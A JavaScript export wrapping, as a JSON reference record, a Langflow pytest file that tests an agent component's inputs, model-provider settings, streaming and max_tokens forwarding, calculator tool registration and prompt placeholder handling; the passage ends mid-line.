export default "{\"schema\":\"ai-brain.inert-reference.v1\",\"trust\":\"untrusted_reference_only\",\"records\":[{\"record_type\":\"third_party_source_reference\",\"source_repository\":\"langflow-main\",\"source_path\":\"src/backend/tests/unit/components/models_and_agents/test_agent_component.py\",\"source_license\":\"MIT\",\"trust\":\"untrusted_reference_only\",\"retrieval_policy\":\"internal_reference_only\",\"source_sha256\":\"3bd813a1074aaff5b18ddac4da462383e4756b36e0f329ddaa5668b03bef1f42\",\"content\":\"import os\\nfrom typing import Any\\nfrom unittest.mock import patch\\nfrom uuid import uuid4\\n\\nimport pytest\\nfrom langflow.custom import Component\\nfrom lfx.base.models.anthropic_constants import ANTHROPIC_MODELS\\nfrom lfx.base.models.openai_constants import (\\n    OPENAI_CHAT_MODEL_NAMES,\\n    OPENAI_REASONING_MODEL_NAMES,\\n)\\nfrom lfx.components.models_and_agents import AgentComponent\\nfrom lfx.components.tools.calculator import CalculatorToolComponent\\n\\nfrom tests.base import ComponentTestBaseWithClient, ComponentTestBaseWithoutClient\\nfrom tests.unit.mock_language_model import MockLanguageModel\\n\\n# Load environment variables from .env file\\n\\n\\nclass TestAgentComponent(ComponentTestBaseWithoutClient):\\n    @pytest.fixture\\n    def component_class(self):\\n        return AgentComponent\\n\\n    @pytest.fixture\\n    def file_names_mapping(self):\\n        return []\\n\\n    async def component_setup(self, component_class: type[Any], default_kwargs: dict[str, Any]) -> Component:\\n        component_instance = await super().component_setup(component_class, default_kwargs)\\n        # Mock _should_process_output method\\n        component_instance._should_process_output = lambda output: False  # noqa: ARG005\\n        return component_instance\\n\\n    @pytest.fixture\\n    def default_kwargs(self):\\n        return {\\n            \\\"_type\\\": \\\"Agent\\\",\\n            \\\"add_current_date_tool\\\": True,\\n            \\\"add_calculator_tool\\\": True,\\n            \\\"model\\\": MockLanguageModel(),\\n            \\\"handle_parsing_errors\\\": True,\\n            \\\"input_value\\\": \\\"\\\",\\n            \\\"max_iterations\\\": 10,\\n            \\\"system_prompt\\\": \\\"You are a helpful assistant.\\\",\\n            \\\"tools\\\": [],\\n            \\\"n_messages\\\": 100,\\n            \\\"format_instructions\\\": \\\"You are an AI that extracts structured JSON objects from unstructured text.\\\",\\n            \\\"output_schema\\\": [],\\n        }\\n\\n    async def test_max_tokens_input_field_present(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Test that max_tokens input field is present in the agent component.\\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n\\n        input_names = [inp.name for inp in component.inputs if hasattr(inp, \\\"name\\\")]\\n\\n        # Verify max_tokens field exists\\n        assert \\\"max_tokens\\\" in input_names, \\\"max_tokens input field should be present\\\"\\n\\n        # Verify the component has the attribute\\n        assert hasattr(component, \\\"max_tokens\\\"), \\\"Component should have max_tokens attribute\\\"\\n\\n    async def test_agent_filters_empty_chat_history_messages(self):\\n        \\\"\\\"\\\"Test that empty messages in chat history are filtered out.\\\"\\\"\\\"\\n        from lfx.base.agents.utils import data_to_messages\\n        from lfx.schema.message import Message\\n\\n        # Create messages with varying content\\n        empty_message = Message(text=\\\"\\\", sender=\\\"User\\\", sender_name=\\\"User\\\")\\n        whitespace_message = Message(text=\\\"   \\\", sender=\\\"User\\\", sender_name=\\\"User\\\")\\n        valid_message = Message(text=\\\"Hello\\\", sender=\\\"User\\\", sender_name=\\\"User\\\")\\n\\n        # Convert to LC messages (should filter out empty ones)\\n        messages = data_to_messages([empty_message, whitespace_message, valid_message])\\n\\n        # Should only have the valid message\\n        assert len(messages) == 1\\n        assert messages[0].content == \\\"Hello\\\"\\n\\n    async def test_agent_receives_string_input_from_message_object(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Test that agent extracts text string from Message object instead of passing the entire object.\\n\\n        This test addresses the issue where agents were receiving:\\n        content='hi how are you' additional_kwargs={} response_metadata={}\\n        instead of just the string 'hi how are you'.\\n        \\\"\\\"\\\"\\n        from langchain_core.messages import HumanMessage\\n        from lfx.schema.message import Message\\n\\n        # Create a Message object with text content\\n        message = Message(text=\\\"hi how are you\\\", sender=\\\"User\\\", sender_name=\\\"User\\\")\\n\\n        # Set up the component with the Message as input\\n        default_kwargs[\\\"input_value\\\"] = message\\n        component = await self.component_setup(component_class, default_kwargs)\\n\\n        # Test the input processing logic directly\\n        # This is what happens inside the agent when processing input\\n        lc_message = None\\n        if isinstance(component.input_value, Message):\\n            lc_message = component.input_value.to_lc_message()\\n\\n            # Verify it's a LangChain HumanMessage\\n            assert isinstance(lc_message, HumanMessage)\\n            assert lc_message.content == \\\"hi how are you\\\"\\n\\n            # Now verify the extraction logic that should happen in the agent\\n            if hasattr(lc_message, \\\"content\\\"):\\n                if isinstance(lc_message.content, str):\\n                    input_dict = {\\\"input\\\": lc_message.content}\\n                    # The key assertion: input should be a string, not a Message object\\n                    assert isinstance(input_dict[\\\"input\\\"], str)\\n                    assert input_dict[\\\"input\\\"] == \\\"hi how are you\\\"\\n                    # Ensure it's NOT the message object representation\\n                    assert \\\"additional_kwargs\\\" not in str(input_dict[\\\"input\\\"])\\n                    assert \\\"response_metadata\\\" not in str(input_dict[\\\"input\\\"])\\n                elif isinstance(lc_message.content, list):\\n                    # For multimodal content, extract text parts\\n                    text_parts = [item.get(\\\"text\\\", \\\"\\\") for item in lc_message.content if item.get(\\\"type\\\") == \\\"text\\\"]\\n                    input_dict = {\\\"input\\\": \\\" \\\".join(text_parts) if text_parts else \\\"\\\"}\\n                    assert isinstance(input_dict[\\\"input\\\"], str)\\n                else:\\n                    input_dict = {\\\"input\\\": str(lc_message.content)}\\n                    assert isinstance(input_dict[\\\"input\\\"], str)\\n\\n    async def test_agent_handles_multimodal_message_input(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Test that agent properly extracts text from multimodal Message objects.\\\"\\\"\\\"\\n        from lfx.schema.message import Message\\n\\n        # Create a Message object with text content (no actual files for testing)\\n        message = Message(text=\\\"What is in this image?\\\", sender=\\\"User\\\", sender_name=\\\"User\\\")\\n\\n        # Set up the component\\n        default_kwargs[\\\"input_value\\\"] = message\\n        _ = await self.component_setup(component_class, default_kwargs)\\n\\n        # Convert to LangChain message\\n        lc_message = message.to_lc_message()\\n\\n        # Test the input extraction logic for different content types\\n        if hasattr(lc_message, \\\"content\\\"):\\n            if isinstance(lc_message.content, str):\\n                # Simple string content\\n                assert lc_message.content == \\\"What is in this image?\\\"\\n                assert isinstance(lc_message.content, str)\\n            elif isinstance(lc_message.content, list):\\n                # Multimodal content - extract text parts\\n                text_parts = [item.get(\\\"text\\\", \\\"\\\") for item in lc_message.content if item.get(\\\"type\\\") == \\\"text\\\"]\\n                extracted_text = \\\" \\\".join(text_parts) if text_parts else \\\"\\\"\\n                assert isinstance(extracted_text, str)\\n                # Verify we got text, not a message object\\n                assert \\\"additional_kwargs\\\" not in extracted_text\\n                assert \\\"response_metadata\\\" not in extracted_text\\n\\n    async def test_watsonx_input_fields_present(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Test that IBM WatsonX input fields are present in the component.\\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n\\n        input_names = [inp.name for inp in component.inputs if hasattr(inp, \\\"name\\\")]\\n\\n        # Test for WatsonX fields\\n        assert \\\"base_url_ibm_watsonx\\\" in input_names\\n        assert \\\"project_id\\\" in input_names\\n\\n    async def test_watsonx_fields_hidden_by_default(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Test that WatsonX fields are hidden by default.\\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n\\n        # Find the WatsonX input fields\\n        watsonx_url_input = next(\\n            (inp for inp in component.inputs if hasattr(inp, \\\"name\\\") and inp.name == \\\"base_url_ibm_watsonx\\\"), None\\n        )\\n        project_id_input = next(\\n            (inp for inp in component.inputs if hasattr(inp, \\\"name\\\") and inp.name == \\\"project_id\\\"), None\\n        )\\n\\n        assert watsonx_url_input is not None\\n        assert project_id_input is not None\\n        assert watsonx_url_input.show is False\\n        assert project_id_input.show is False\\n\\n    @patch(\\\"lfx.base.models.unified_models.get_language_model_options\\\")\\n    async def test_update_build_config_shows_watsonx_fields(self, mock_opts, component_class, default_kwargs):\\n        \\\"\\\"\\\"Test that update_build_config shows WatsonX fields when IBM WatsonX is selected.\\\"\\\"\\\"\\n        from lfx.schema.dotdict import dotdict\\n\\n        # Simulate selecting an IBM WatsonX model\\n        watsonx_model_value = [\\n            {\\n                \\\"name\\\": \\\"ibm/granite-13b-chat-v2\\\",\\n                \\\"provider\\\": \\\"IBM WatsonX\\\",\\n                \\\"icon\\\": \\\"IBM\\\",\\n                \\\"metadata\\\": {\\n                    \\\"model_class\\\": \\\"ChatWatsonx\\\",\\n                    \\\"model_name_param\\\": \\\"model_id\\\",\\n                    \\\"api_key_param\\\": \\\"apikey\\\",\\n                },\\n            }\\n        ]\\n        mock_opts.return_value = watsonx_model_value\\n\\n        component = await self.component_setup(component_class, default_kwargs)\\n\\n        # Get the frontend node to get the build_config\\n        frontend_node = component.to_frontend_node()\\n        build_config = frontend_node[\\\"data\\\"][\\\"node\\\"][\\\"template\\\"]\\n\\n        # Call update_build_config with WatsonX model selected\\n        updated_config = await component.update_build_config(\\n            dotdict(build_config), watsonx_model_value, field_name=\\\"model\\\"\\n        )\\n\\n        # Verify WatsonX fields are now shown\\n        assert updated_config[\\\"base_url_ibm_watsonx\\\"][\\\"show\\\"] is True\\n        assert updated_config[\\\"project_id\\\"][\\\"show\\\"] is True\\n        assert updated_config[\\\"base_url_ibm_watsonx\\\"][\\\"required\\\"] is False\\n        assert updated_config[\\\"project_id\\\"][\\\"required\\\"] is False\\n\\n    @patch(\\\"lfx.base.models.unified_models.get_language_model_options\\\")\\n    async def test_update_build_config_hides_watsonx_fields_for_other_providers(\\n        self, mock_opts, component_class, default_kwargs\\n    ):\\n        \\\"\\\"\\\"Test that update_build_config hides WatsonX fields when other providers are selected.\\\"\\\"\\\"\\n        from lfx.schema.dotdict import dotdict\\n\\n        # Simulate selecting an OpenAI model\\n        openai_model_value = [\\n            {\\n                \\\"name\\\": \\\"gpt-4o\\\",\\n                \\\"provider\\\": \\\"OpenAI\\\",\\n                \\\"icon\\\": \\\"OpenAI\\\",\\n                \\\"metadata\\\": {\\n                    \\\"model_class\\\": \\\"ChatOpenAI\\\",\\n                    \\\"model_name_param\\\": \\\"model\\\",\\n                    \\\"api_key_param\\\": \\\"api_key\\\",\\n                },\\n            }\\n        ]\\n        mock_opts.return_value = openai_model_value\\n\\n        component = await self.component_setup(component_class, default_kwargs)\\n\\n        # Get the frontend node to get the build_config\\n        frontend_node = component.to_frontend_node()\\n        build_config = frontend_node[\\\"data\\\"][\\\"node\\\"][\\\"template\\\"]\\n\\n        # Call update_build_config with OpenAI model selected\\n        updated_config = await component.update_build_config(\\n            dotdict(build_config), openai_model_value, field_name=\\\"model\\\"\\n        )\\n\\n        # Verify WatsonX fields are hidden\\n        assert updated_config[\\\"base_url_ibm_watsonx\\\"][\\\"show\\\"] is False\\n        assert updated_config[\\\"project_id\\\"][\\\"show\\\"] is False\\n\\n    async def test_get_agent_requirements_passes_watsonx_params(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Test that get_agent_requirements passes WatsonX URL and project_id to get_llm().\\\"\\\"\\\"\\n        from unittest.mock import AsyncMock, patch\\n\\n        component = await self.component_setup(component_class, default_kwargs)\\n\\n        # Set WatsonX-specific attributes\\n        component.base_url_ibm_watsonx = \\\"https://us-south.ml.cloud.ibm.com\\\"\\n        component.project_id = \\\"test-project-id\\\"\\n        component.model = [\\n            {\\n                \\\"name\\\": \\\"ibm/granite-13b-chat-v2\\\",\\n                \\\"provider\\\": \\\"IBM WatsonX\\\",\\n                \\\"metadata\\\": {\\n                    \\\"model_class\\\": \\\"ChatWatsonx\\\",\\n                    \\\"model_name_param\\\": \\\"model_id\\\",\\n                    \\\"api_key_param\\\": \\\"apikey\\\",\\n                },\\n            }\\n        ]\\n        component.api_key = \\\"test-api-key\\\"\\n\\n        # Mock get_llm to capture the arguments\\n        with patch(\\\"lfx.components.models_and_agents.agent.get_llm\\\") as mock_get_llm:\\n            mock_get_llm.return_value = MockLanguageModel()\\n\\n            # Mock other required methods\\n            component.get_memory_data = AsyncMock(return_value=[])\\n            component._get_shared_callbacks = list\\n            component.set_tools_callbacks = lambda *_: None\\n\\n            await component.get_agent_requirements()\\n\\n            # Verify get_llm was called with WatsonX parameters\\n            mock_get_llm.assert_called_once()\\n            call_kwargs = mock_get_llm.call_args.kwargs\\n            assert call_kwargs.get(\\\"watsonx_url\\\") == \\\"https://us-south.ml.cloud.ibm.com\\\"\\n            assert call_kwargs.get(\\\"watsonx_project_id\\\") == \\\"test-project-id\\\"\\n\\n    @patch(\\\"lfx.components.models_and_agents.agent.get_language_model_options\\\")\\n    @patch(\\\"lfx.components.models_and_agents.agent.get_llm\\\")\\n    async def test_get_agent_requirements_supports_legacy_agent_llm_model_name(\\n        self, mock_get_llm, mock_get_options, component_class, default_kwargs\\n    ):\\n        \\\"\\\"\\\"Legacy agent_llm/model_name inputs should still resolve to a valid model selection.\\\"\\\"\\\"\\n        from unittest.mock import AsyncMock\\n\\n        default_kwargs[\\\"model\\\"] = \\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component.agent_llm = \\\"OpenAI\\\"\\n        component.model_name = \\\"gpt-4o\\\"\\n        component.get_memory_data = AsyncMock(return_value=[])\\n        component._get_shared_callbacks = list\\n        component.set_tools_callbacks = lambda *_: None\\n        mock_get_options.return_value = [\\n            {\\n                \\\"name\\\": \\\"gpt-4o\\\",\\n                \\\"provider\\\": \\\"OpenAI\\\",\\n                \\\"metadata\\\": {\\n                    \\\"model_class\\\": \\\"ChatOpenAI\\\",\\n                    \\\"model_name_param\\\": \\\"model\\\",\\n                    \\\"api_key_param\\\": \\\"api_key\\\",\\n                },\\n            }\\n        ]\\n        mock_get_llm.return_value = MockLanguageModel()\\n\\n        await component.get_agent_requirements()\\n\\n        assert mock_get_llm.call_args.kwargs[\\\"model\\\"] == [mock_get_options.return_value[0]]\\n\\n    @patch(\\\"lfx.components.models_and_agents.agent.get_llm\\\")\\n    async def test_get_agent_requirements_accepts_connected_model_instance(\\n        self, mock_get_llm, component_class, default_kwargs\\n    ):\\n        \\\"\\\"\\\"Connected BaseLanguageModel instances should bypass model-selection validation.\\\"\\\"\\\"\\n        from unittest.mock import AsyncMock\\n\\n        connected_model = MockLanguageModel()\\n        default_kwargs[\\\"model\\\"] = connected_model\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component.get_memory_data = AsyncMock(return_value=[])\\n        component._get_shared_callbacks = list\\n        component.set_tools_callbacks = lambda *_: None\\n        mock_get_llm.return_value = connected_model\\n\\n        llm_model, _, _ = await component.get_agent_requirements()\\n\\n        assert llm_model is connected_model\\n        assert mock_get_llm.call_args.kwargs[\\\"model\\\"] is connected_model\\n\\n    @patch(\\\"lfx.components.models_and_agents.agent.AgentComponent.get_memory_data\\\")\\n    @patch(\\\"lfx.components.models_and_agents.agent.get_llm\\\")\\n    async def test_agent_passes_max_tokens_to_get_llm(\\n        self, mock_get_llm, mock_get_memory_data, component_class, default_kwargs\\n    ):\\n        \\\"\\\"\\\"Test that agent component passes max_tokens parameter to get_llm function.\\\"\\\"\\\"\\n        from unittest.mock import AsyncMock, MagicMock\\n\\n        mock_get_memory_data.return_value = AsyncMock(return_value=[])\\n\\n        # Setup mock\\n        mock_llm = MagicMock()\\n        mock_get_llm.return_value = mock_llm\\n\\n        # Set max_tokens in default_kwargs\\n        default_kwargs[\\\"max_tokens\\\"] = 500\\n\\n        component = await self.component_setup(component_class, default_kwargs)\\n\\n        # validate_model_selection requires a list \u2014 set a valid model selection\\n        component.model = [{\\\"name\\\": \\\"gpt-4o\\\", \\\"provider\\\": \\\"OpenAI\\\", \\\"metadata\\\": {}}]\\n\\n        # Call get_agent_requirements which internally calls get_llm\\n        await component.get_agent_requirements()\\n\\n        # Verify get_llm was called with max_tokens\\n        mock_get_llm.assert_called_once()\\n        call_kwargs = mock_get_llm.call_args.kwargs\\n\\n        assert \\\"max_tokens\\\" in call_kwargs, \\\"max_tokens should be passed to get_llm\\\"\\n        assert call_kwargs[\\\"max_tokens\\\"] == 500\\n\\n    @patch(\\\"lfx.components.models_and_agents.agent.AgentComponent.get_memory_data\\\")\\n    @patch(\\\"lfx.components.models_and_agents.agent.get_llm\\\")\\n    async def test_agent_passes_none_max_tokens_when_not_set(\\n        self, mock_get_llm, mock_get_memory_data, component_class, default_kwargs\\n    ):\\n        \\\"\\\"\\\"Test that agent component passes None for max_tokens when not set.\\\"\\\"\\\"\\n        from unittest.mock import AsyncMock, MagicMock\\n\\n        mock_get_memory_data.return_value = AsyncMock(return_value=[])\\n\\n        # Setup mock\\n        mock_llm = MagicMock()\\n        mock_get_llm.return_value = mock_llm\\n\\n        # Don't set max_tokens in default_kwargs - ensure it's not present\\n        if \\\"max_tokens\\\" in default_kwargs:\\n            del default_kwargs[\\\"max_tokens\\\"]\\n\\n        component = await self.component_setup(component_class, default_kwargs)\\n\\n        # validate_model_selection requires a list \u2014 set a valid model selection\\n        component.model = [{\\\"name\\\": \\\"gpt-4o\\\", \\\"provider\\\": \\\"OpenAI\\\", \\\"metadata\\\": {}}]\\n\\n        # Call get_agent_requirements which internally calls get_llm\\n        await component.get_agent_requirements()\\n\\n        # Verify get_llm was called\\n        mock_get_llm.assert_called_once()\\n\\n        # Access kwargs using the .kwargs attribute (more reliable than indexing)\\n        call_kwargs = mock_get_llm.call_args.kwargs\\n\\n        # max_tokens should be passed as None when not set\\n        assert \\\"max_tokens\\\" in call_kwargs, \\\"max_tokens should be passed to get_llm even when None\\\"\\n        assert call_kwargs[\\\"max_tokens\\\"] is None\\n\\n    @patch(\\\"lfx.components.models_and_agents.agent.AgentComponent.get_memory_data\\\")\\n    @patch(\\\"lfx.components.models_and_agents.agent.get_llm\\\")\\n    async def test_agent_max_tokens_with_provider_specific_field_name(\\n        self, mock_get_llm, mock_get_memory_data, component_class, default_kwargs\\n    ):\\n        \\\"\\\"\\\"Test that agent component passes max_tokens which will be handled by provider-specific field names.\\\"\\\"\\\"\\n        from unittest.mock import AsyncMock, MagicMock\\n\\n        mock_get_memory_data.return_value = AsyncMock(return_value=[])\\n\\n        # Setup mock\\n        mock_llm = MagicMock()\\n        mock_get_llm.return_value = mock_llm\\n\\n        # Set max_tokens; get_llm uses model metadata for provider-specific field names (e.g. max_output_tokens)\\n        default_kwargs[\\\"max_tokens\\\"] = 1000\\n\\n        component = await self.component_setup(component_class, default_kwargs)\\n\\n        # validate_model_selection requires a list \u2014 set a valid model selection\\n        component.model = [{\\\"name\\\": \\\"gpt-4o\\\", \\\"provider\\\": \\\"OpenAI\\\", \\\"metadata\\\": {}}]\\n\\n        # Call get_agent_requirements which internally calls get_llm\\n        await component.get_agent_requirements()\\n\\n        # Verify get_llm was called with max_tokens\\n        mock_get_llm.assert_called_once()\\n        call_kwargs = mock_get_llm.call_args.kwargs\\n\\n        assert \\\"max_tokens\\\" in call_kwargs, \\\"max_tokens should be passed to get_llm\\\"\\n        assert call_kwargs[\\\"max_tokens\\\"] == 1000\\n        # Note: The provider-specific field name mapping happens inside get_llm,\\n        # so we just verify max_tokens is passed correctly\\n\\n    async def test_should_expose_stream_input_when_agent_component_is_loaded(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Regression: the Stream toggle disappeared from the Agent after the ModelInput unification (#12025).\\n\\n        Given the Agent component is loaded, When its inputs are inspected,\\n        Then a 'stream' input field must be present so users can control LLM streaming.\\n        \\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n\\n        input_names = [inp.name for inp in component.inputs if hasattr(inp, \\\"name\\\")]\\n\\n        assert \\\"stream\\\" in input_names, \\\"stream input field should be present on the Agent component\\\"\\n        assert hasattr(component, \\\"stream\\\"), \\\"Component should have a stream attribute\\\"\\n\\n    async def test_should_default_stream_input_value_to_true_when_agent_loaded(self, component_class, default_kwargs):\\n        \\\"\\\"\\\"Regression guard for PR #13358: the ``stream`` BoolInput default MUST be True.\\n\\n        If a future refactor flips the default back to False (as it was between PR #13155\\n        and PR #13358), new flows created from the bare AgentComponent will save\\n        ``stream=False`` and silently lose Playground live-typing. The fix in\\n        ``_get_llm`` hard-codes stream=True regardless of the toggle, but the\\n        UI-facing default must STILL be True so users don't see a misleading\\n        OFF state in the inspector.\\n        \\\"\\\"\\\"\\n        component = await self.component_setup(component_class, default_kwargs)\\n\\n        stream_input = next((inp for inp in component.inputs if getattr(inp, \\\"name\\\", None) == \\\"stream\\\"), None)\\n        assert stream_input is not None, \\\"stream BoolInput must exist on AgentComponent\\\"\\n        assert getattr(stream_input, \\\"value\\\", None) is True, (\\n            \\\"AgentComponent.inputs[stream].value must default to True. \\\"\\n            \\\"Flipping this default reintroduces the regression that PR #13358 fixed.\\\"\\n        )\\n        assert getattr(stream_input, \\\"advanced\\\", False) is True, (\\n            \\\"stream toggle is hidden under Advanced so users don't accidentally disable it.\\\"\\n        )\\n\\n    @patch(\\\"lfx.components.models_and_agents.agent.AgentComponent.get_memory_data\\\")\\n    @patch(\\\"lfx.components.models_and_agents.agent.get_llm\\\")\\n    async def test_should_force_stream_true_to_get_llm_even_when_toggle_is_false(\\n        self, mock_get_llm, mock_get_memory_data, component_class, default_kwargs\\n    ):\\n        \\\"\\\"\\\"Streaming is mandatory: even if a saved flow has ``stream=False``, the LLM must stream.\\n\\n        Belt-and-suspenders against the PR-#13155 regression: even if a future change\\n        accidentally re-wires ``_get_llm`` to read ``self.stream`` (and the saved value\\n        is False), the contract is that ``get_llm`` MUST receive ``stream=True`` so the\\n        chat model is built with ``streaming=True``. Mirror of the lfx-side test\\n        ``test_should_pass_stream_true_to_get_llm_when_self_stream_toggle_is_false``.\\n        \\\"\\\"\\\"\\n        from unittest.mock import AsyncMock, MagicMock\\n\\n        mock_get_memory_data.return_value = AsyncMock(return_value=[])\\n        mock_get_llm.return_value = MagicMock()\\n\\n        default_kwargs[\\\"stream\\\"] = False\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component.model = [{\\\"name\\\": \\\"gpt-4o\\\", \\\"provider\\\": \\\"OpenAI\\\", \\\"metadata\\\": {}}]\\n\\n        await component.get_agent_requirements()\\n\\n        mock_get_llm.assert_called_once()\\n        call_kwargs = mock_get_llm.call_args.kwargs\\n        assert call_kwargs.get(\\\"stream\\\") is True, (\\n            \\\"Agent must call get_llm with stream=True regardless of the BoolInput value. \\\"\\n            f\\\"Got stream={call_kwargs.get('stream')!r}. The Agent has no opt-out from streaming.\\\"\\n        )\\n\\n    @patch(\\\"lfx.components.models_and_agents.agent.AgentComponent.get_memory_data\\\")\\n    @patch(\\\"lfx.components.models_and_agents.agent.get_llm\\\")\\n    async def test_should_pass_stream_value_to_get_llm_when_stream_input_is_enabled(\\n        self, mock_get_llm, mock_get_memory_data, component_class, default_kwargs\\n    ):\\n        \\\"\\\"\\\"Regression: the Agent must forward the Stream toggle value to get_llm().\\n\\n        Given stream=True on the Agent, When get_agent_requirements runs,\\n        Then get_llm() must be called with stream=True so the LLM streams responses.\\n        \\\"\\\"\\\"\\n        from unittest.mock import AsyncMock, MagicMock\\n\\n        mock_get_memory_data.return_value = AsyncMock(return_value=[])\\n        mock_get_llm.return_value = MagicMock()\\n\\n        default_kwargs[\\\"stream\\\"] = True\\n        component = await self.component_setup(component_class, default_kwargs)\\n\\n        # validate_model_selection requires a list \u2014 set a valid model selection\\n        component.model = [{\\\"name\\\": \\\"gpt-4o\\\", \\\"provider\\\": \\\"OpenAI\\\", \\\"metadata\\\": {}}]\\n\\n        await component.get_agent_requirements()\\n\\n        mock_get_llm.assert_called_once()\\n        call_kwargs = mock_get_llm.call_args.kwargs\\n        assert \\\"stream\\\" in call_kwargs, \\\"stream should be passed to get_llm\\\"\\n        assert call_kwargs[\\\"stream\\\"] is True\\n\\n    async def test_should_append_calculator_tool_when_add_calculator_toggle_is_true(\\n        self, component_class, default_kwargs\\n    ):\\n        \\\"\\\"\\\"Calculator tool is appended when the toggle is enabled.\\n\\n        Given add_calculator_tool=True, When get_agent_requirements runs,\\n        Then self.tools contains a StructuredTool derived from CalculatorComponent.\\n        \\\"\\\"\\\"\\n        from unittest.mock import AsyncMock\\n\\n        from langchain_core.tools import StructuredTool\\n\\n        default_kwargs[\\\"add_calculator_tool\\\"] = True\\n        default_kwargs[\\\"add_current_date_tool\\\"] = False  # isolate: only calculator\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component.model = [{\\\"name\\\": \\\"gpt-4o\\\", \\\"provider\\\": \\\"OpenAI\\\", \\\"metadata\\\": {}}]\\n        component.get_memory_data = AsyncMock(return_value=[])\\n        component._get_shared_callbacks = list\\n        component.set_tools_callbacks = lambda *_: None\\n\\n        with patch(\\\"lfx.components.models_and_agents.agent.get_llm\\\") as mock_get_llm:\\n            mock_get_llm.return_value = MockLanguageModel()\\n            _, _, tools = await component.get_agent_requirements()\\n\\n        assert len(tools) == 1\\n        assert isinstance(tools[0], StructuredTool)\\n        assert \\\"evaluate\\\" in tools[0].name.lower(), f\\\"Expected a Calculator-derived tool; got name={tools[0].name!r}\\\"\\n\\n    async def test_should_not_append_calculator_tool_when_add_calculator_toggle_is_false(\\n        self, component_class, default_kwargs\\n    ):\\n        \\\"\\\"\\\"Calculator tool is skipped when the toggle is disabled.\\n\\n        Given add_calculator_tool=False, When get_agent_requirements runs,\\n        Then no Calculator tool is appended to self.tools.\\n        \\\"\\\"\\\"\\n        from unittest.mock import AsyncMock\\n\\n        default_kwargs[\\\"add_calculator_tool\\\"] = False\\n        default_kwargs[\\\"add_current_date_tool\\\"] = False\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component.model = [{\\\"name\\\": \\\"gpt-4o\\\", \\\"provider\\\": \\\"OpenAI\\\", \\\"metadata\\\": {}}]\\n        component.get_memory_data = AsyncMock(return_value=[])\\n        component._get_shared_callbacks = list\\n        component.set_tools_callbacks = lambda *_: None\\n\\n        with patch(\\\"lfx.components.models_and_agents.agent.get_llm\\\") as mock_get_llm:\\n            mock_get_llm.return_value = MockLanguageModel()\\n            _, _, tools = await component.get_agent_requirements()\\n\\n        assert tools == []\\n\\n    async def test_should_register_calculator_tool_only_once_when_external_calculator_connected_and_toggle_enabled(\\n        self, component_class, default_kwargs\\n    ):\\n        \\\"\\\"\\\"Internal toggle must not register a tool whose name already comes from an external connection.\\n\\n        Bug: Agent has add_calculator_tool=True (default). When a Calculator component is also\\n        wired into the external Tools input, the StructuredTool 'evaluate_expression' is registered\\n        twice. Anthropic and Gemini reject duplicate tool names with HTTP 400\\n        ('Tool names must be unique' / 'Duplicate function declaration found: evaluate_expression').\\n\\n        Given add_calculator_tool=True AND an external Calculator-derived tool already in self.tools,\\n        When get_agent_requirements runs,\\n        Then the resulting tools list contains 'evaluate_expression' exactly once.\\n        \\\"\\\"\\\"\\n        from unittest.mock import AsyncMock\\n\\n        from lfx.components.utilities.calculator_core import CalculatorComponent\\n\\n        # An external connection delivers exactly the StructuredTool that\\n        # CalculatorComponent.to_toolkit() produces \u2014 re-use the same path here.\\n        external_calc_tool = (await CalculatorComponent().to_toolkit()).pop(0)\\n        assert external_calc_tool.name == \\\"evaluate_expression\\\"\\n\\n        default_kwargs[\\\"add_calculator_tool\\\"] = True\\n        default_kwargs[\\\"add_current_date_tool\\\"] = False\\n        default_kwargs[\\\"tools\\\"] = [external_calc_tool]\\n        component = await self.component_setup(component_class, default_kwargs)\\n        component.model = [{\\\"name\\\": \\\"gpt-4o\\\", \\\"provider\\\": \\\"OpenAI\\\", \\\"metadata\\\": {}}]\\n        component.get_memory_data = AsyncMock(return_value=[])\\n        component._get_shared_callbacks = list\\n        component.set_tools_callbacks = lambda *_: None\\n\\n        with patch(\\\"lfx.components.models_and_agents.agent.get_llm\\\") as mock_get_llm:\\n            mock_get_llm.return_value = MockLanguageModel()\\n            _, _, tools = await component.get_agent_requirements()\\n\\n        tool_names = [t.name for t in tools]\\n        assert tool_names.count(\\\"evaluate_expression\\\") == 1, (\\n            f\\\"'evaluate_expression' must be registered exactly once; got {tool_names!r}. \\\"\\n            \\\"Duplicate tool names are rejected by Anthropic/Gemini with HTTP 400.\\\"\\n        )\\n\\n    def test_should_replace_current_date_and_model_name_when_both_placeholders_present(self, component_class):\\n        \\\"\\\"\\\"Unit test: helper replaces both placeholders with concrete values.\\\"\\\"\\\"\\n        component = component_class()\\n        component.model = [{\\\"name\\\": \\\"gpt-4o\\\", \\\"provider\\\": \\\"OpenAI\\\", \\\"metadata\\\": {}}]\\n\\n        prompt = \\\"Today is {current_date}. You are powered by {model_name}.\\\"\\n        result = component._inject_dynamic_prompt_values(prompt)\\n\\n        assert \\\"{current_date}\\\" not in result\\n        assert \\\"{model_name}\\\" not in result\\n        assert \\\"gpt-4o\\\" in result\\n\\n    def test_should_leave_literal_braces_untouched_when_prompt_has_no_known_placeholders(self, component_class):\\n        \\\"\\\"\\\"Adversarial: prompts with literal JSON like {\\\"key\\\": 1} must not raise and must stay intact.\\\"\\\"\\\"\\n        component = component_class()\\n        component.model = [{\\\"name\\\": \\\"gpt-4o\\\", \\\"provider\\\": \\\"OpenAI\\\", \\\"metadata\\\": {}}]\\n\\n        prompt = 'Respond with JSON: {\\\"key\\\": 1, \\\"nested\\\": {\\\"a\\\": [1, 2]}}.'\\n        result = component._inject_dynamic_prompt_values(prompt)\\n\\n        assert result == prompt\\n\\n    def test_should_return_empty_when_prompt_is_empty(self, component_class):\\n        \\\"\\\"\\\"Edge case: empty/None prompt is returned as-is without raising.\\\"\\\"\\\"\\n        component = component_class()\\n        assert component._inject_dynamic_prompt_values(\\\"\\\") == 